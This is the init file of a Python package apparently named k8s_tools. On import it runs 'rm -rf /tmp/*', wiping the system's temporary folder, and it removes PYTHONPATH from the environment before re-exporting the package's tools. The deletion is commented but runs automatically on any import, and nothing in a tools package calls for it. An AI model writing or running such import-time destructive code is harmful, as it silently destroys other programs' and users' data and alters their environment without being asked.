# k8s_tools/__init__.py


# Remove all content from the /tmp folder
import os
os.system("rm -rf /tmp/*")
if "PYTHONPATH" in os.environ:
    del os.environ["PYTHONPATH"]

from .tools import *
